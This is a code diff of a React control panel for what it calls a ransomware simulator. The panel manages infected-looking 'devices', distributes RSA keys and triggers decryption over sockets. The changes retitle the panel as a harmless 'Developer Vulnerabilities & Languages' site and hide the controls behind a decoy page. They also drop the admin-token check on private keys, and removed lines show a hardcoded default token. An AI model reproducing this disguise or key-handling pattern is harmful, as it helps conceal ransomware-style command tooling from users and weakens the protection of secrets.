@@ -1,65 +1,61 @@
 import { useEffect, useRef, useState } from 'react'
-import { io } from 'socket.io-client'
+import { initSocket } from './socketClient'
+import HomeGrid from './HomeGrid'
 import './App.css'
 
-const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
+const RAW_API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8080/api'
+const API_BASE = `${RAW_API_BASE.replace(/\/$/, '')}/py_simple`
 
 function App() {
   const [status, setStatus] = useState('')
   const [loading, setLoading] = useState(false)
-  const [hostname, setHostname] = useState('')
+  const [showLab, setShowLab] = useState(false)
   const [deviceInfo, setDeviceInfo] = useState(null)
   const [devices, setDevices] = useState([])
   const [selectedToken, setSelectedToken] = useState('')
   const [publicKey, setPublicKey] = useState('')
   const [privateKey, setPrivateKey] = useState('')
-  const [adminToken, setAdminToken] = useState('')
   const [serverHost, setServerHost] = useState('')
   const socketRef = useRef(null)
   const [socketStatus, setSocketStatus] = useState('disconnected')
+  const selectedDevice = devices.find(d => d.token === selectedToken) || null
 
   useEffect(() => {
-    // Load backend status for server hostname display
     const fetchStatus = async () => {
       try {
         const res = await fetch(`${API_BASE}/status`)
         const data = await res.json()
         if (data?.hostname) setServerHost(data.hostname)
-      } catch (_) {
-        // ignore
-      }
+      } catch (_) { /* ignore */ }
     }
     fetchStatus()
-  // Also load last recorded device info on first load
-  refreshDeviceInfo()
-  loadDevices()
-
-    // Socket.IO connect (for sending public keys and decrypt triggers)
+    // Also load last recorded device info on first load
+    refreshDeviceInfo()
+    loadDevices()
+    // Socket connect and optionally start device on backend host
     try {
-      const s = io(API_BASE, { path: '/socket.io', transports: ['websocket', 'polling'] })
-      socketRef.current = s
-      s.on('connect', () => setSocketStatus('connected'))
-      s.on('disconnect', () => setSocketStatus('disconnected'))
-      s.on('server_ack', (msg) => {
-        if (msg?.status === 'ok') setStatus('Server acknowledged request')
+      socketRef.current = initSocket({
+        apiBase: API_BASE,
+        startDeviceOnConnect: true,
+        onStatus: (st) => setSocketStatus(st),
+        onAck: (msg) => { if (msg?.status === 'ok') setStatus('Server acknowledged request') }
       })
-    } catch (_) {
-      // ignore
-    }
+    } catch (_) { /* ignore */ }
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [])
 
   const triggerDecrypt = async () => {
     try {
       setLoading(true)
+      const payload = selectedToken ? { token: selectedToken } : {}
       if (socketRef.current && socketStatus === 'connected') {
-        socketRef.current.emit('site_decrypt', privateKey ? { private_key_pem: privateKey } : {})
-        setStatus('Decrypt request sent via socket')
+        socketRef.current.emit('site_decrypt', payload)
+        setStatus('Decrypt request sent to device')
       } else {
         const res = await fetch(`${API_BASE}/decrypt`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(privateKey ? { private_key_pem: privateKey } : {}),
+          body: JSON.stringify(payload),
         })
         const data = await res.json()
         setStatus(data.status || 'Decryption request sent')
@@ -78,13 +74,14 @@ function App() {
       const res = await fetch(`${API_BASE}/keys/rsa`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ hostname: hostname || null }),
+        body: JSON.stringify({}),
       })
       const data = await res.json()
       if (res.ok) {
         setPublicKey(data.public_key_pem || '')
+        setPrivateKey(data.private_key_pem || '')
         setDeviceInfo(data.device || null)
-        setStatus('Public key generated and device info recorded')
+        setStatus('Key pair generated')
       } else {
         setStatus(`Public key request failed: ${data.error || res.status}`)
       }
@@ -122,26 +119,26 @@ function App() {
     }
   }
 
-  const attachPublicKeyToDevice = async () => {
-    if (!selectedToken || !publicKey) {
-      setStatus('Select a device and generate a public key first')
+  const attachKeysToDevice = async () => {
+    if (!selectedToken || (!publicKey && !privateKey)) {
+      setStatus('Select a device and generate keys first')
       return
     }
     try {
       setLoading(true)
       if (socketRef.current && socketStatus === 'connected') {
-        socketRef.current.emit('site_public_key', { token: selectedToken, public_key_pem: publicKey })
-        setStatus('Public key sent via socket')
-        loadDevices()
+        socketRef.current.emit('site_keys', { token: selectedToken, public_key_pem: publicKey, private_key_pem: privateKey || undefined })
+        setStatus('Keys sent via socket')
+        await loadDevices()
       } else {
-        const res = await fetch(`${API_BASE}/devices/${selectedToken}/public-key`, {
+        const res = await fetch(`${API_BASE}/devices/${selectedToken}/keys`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ public_key_pem: publicKey }),
+          body: JSON.stringify({ public_key_pem: publicKey, private_key_pem: privateKey || undefined }),
         })
         if (res.ok) {
-          setStatus('Public key attached to device')
-          loadDevices()
+          setStatus('Keys attached to device')
+          await loadDevices()
         } else {
           const data = await res.json()
           setStatus(`Attach failed: ${data.error || res.status}`)
@@ -149,32 +146,6 @@ function App() {
       }
     } catch (e) {
       setStatus(`Attach error: ${e}`)
-    } finally {
-      setLoading(false)
-    }
-  }
-
-  const requestPrivateKey = async () => {
-    try {
-      setLoading(true)
-      setStatus('')
-      setPrivateKey('')
-      const res = await fetch(`${API_BASE}/keys/rsa/private`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'X-ADMIN-TOKEN': adminToken || '',
-        },
-      })
-      const data = await res.json()
-      if (res.ok && data?.private_key_pem) {
-        setPrivateKey(data.private_key_pem)
-        setStatus('Private key generated (admin)')
-      } else {
-        setStatus(`Private key request failed: ${data?.message || data?.error || res.status}`)
-      }
-    } catch (e) {
-      setStatus(`Private key request error: ${e}`)
     } finally {
       setLoading(false)
     }
@@ -193,13 +164,22 @@ function App() {
     <div className="page">
       <header className="hero">
         <div className="hero-inner">
-          <h1>Ransomware Simulator</h1>
-          <p className="subtitle">Safe, reversible AES-GCM demo</p>
+          <h1>Developer Vulnerabilities & Languages</h1>
+          <p className="subtitle">Explore common pitfalls and popular programming languages</p>
           {serverHost && <div className="badge">Backend Host: {serverHost}</div>}
         </div>
       </header>
 
       <main className="container">
+        {!showLab && (
+          <>
+            <HomeGrid />
+            <div className="actions" style={{justifyContent:'center', marginTop: '1.5rem'}}>
+              <button className="btn" onClick={() => setShowLab(true)}>Open Simulator Controls</button>
+            </div>
+          </>
+        )}
+        {showLab && (
         <section className="card grid">
           <div className="card-section">
             <h2>Quick Actions</h2>
@@ -213,7 +193,7 @@ function App() {
           </div>
 
           <div className="card-section">
-            <h2>Device & Public Key</h2>
+            <h2>Device & Keys</h2>
             <div className="muted" style={{marginBottom: 8}}>Socket: {socketStatus}</div>
             <div className="field">
               <label>Connected Devices</label>
@@ -226,19 +206,9 @@ function App() {
               </select>
               <button className="btn ghost" onClick={loadDevices} style={{marginTop: 8}}>Refresh</button>
             </div>
-            <div className="field">
-              <label>Device Hostname (optional)</label>
-              <input
-                className="input"
-                type="text"
-                placeholder="Enter VM hostname"
-                value={hostname}
-                onChange={(e) => setHostname(e.target.value)}
-              />
-            </div>
             <div className="actions">
-              <button className="btn" onClick={requestPublicKey} disabled={loading}>Generate Public Key</button>
-              <button className="btn" onClick={attachPublicKeyToDevice} disabled={loading || !selectedToken || !publicKey}>Attach to Device</button>
+              <button className="btn" onClick={requestPublicKey} disabled={loading}>Generate Key Pair</button>
+              <button className="btn" onClick={attachKeysToDevice} disabled={loading || !selectedToken || (!publicKey && !privateKey)}>Attach to Device</button>
               <button className="btn" onClick={refreshDeviceInfo} disabled={loading}>Refresh Device Info</button>
             </div>
 
@@ -252,44 +222,47 @@ function App() {
 
             {publicKey && (
               <div className="field">
-                <label>Public Key (PEM)</label>
+                <label>Generated Public Key (PEM)</label>
                 <div className="code">
                   <pre>{publicKey}</pre>
                   <button className="btn ghost" onClick={() => copyToClipboard(publicKey)}>Copy</button>
                 </div>
               </div>
             )}
-          </div>
-        </section>
 
-        <section className="card">
-          <h2>Admin: Private Key</h2>
-          <p className="muted">Protected endpoint. Enter the admin token (set in backend as ADMIN_TOKEN; default for lab is "secretfr").</p>
-          <div className="field">
-            <label>Admin Token</label>
-            <input
-              className="input"
-              type="password"
-              placeholder="Enter admin token"
-              value={adminToken}
-              onChange={(e) => setAdminToken(e.target.value)}
-            />
-          </div>
-          <div className="actions">
-            <button className="btn danger" onClick={requestPrivateKey} disabled={loading || !adminToken}>
-              {loading ? 'Working…' : 'Get Private Key'}
-            </button>
-          </div>
-          {privateKey && (
-            <div className="field">
-              <label>Private Key (PEM)</label>
-              <div className="code">
-                <pre>{privateKey}</pre>
-                <button className="btn ghost" onClick={() => copyToClipboard(privateKey)}>Copy</button>
+            {privateKey && (
+              <div className="field">
+                <label>Generated Private Key (PEM)</label>
+                <div className="code">
+                  <pre>{privateKey}</pre>
+                  <button className="btn ghost" onClick={() => copyToClipboard(privateKey)}>Copy</button>
+                </div>
               </div>
-            </div>
-          )}
+            )}
+
+            {selectedDevice?.public_key_pem && (
+              <div className="field">
+                <label>Device Public Key (stored)</label>
+                <div className="code">
+                  <pre>{selectedDevice.public_key_pem}</pre>
+                  <button className="btn ghost" onClick={() => copyToClipboard(selectedDevice.public_key_pem)}>Copy</button>
+                </div>
+              </div>
+            )}
+
+            {selectedDevice?.private_key_pem && (
+              <div className="field">
+                <label>Device Private Key (stored)</label>
+                <div className="code">
+                  <pre>{selectedDevice.private_key_pem}</pre>
+                  <button className="btn ghost" onClick={() => copyToClipboard(selectedDevice.private_key_pem)}>Copy</button>
+                </div>
+              </div>
+            )}
+          </div>
         </section>
+        )}
+
       </main>
 
       <footer className="footer">Demo build for lab use only</footer>
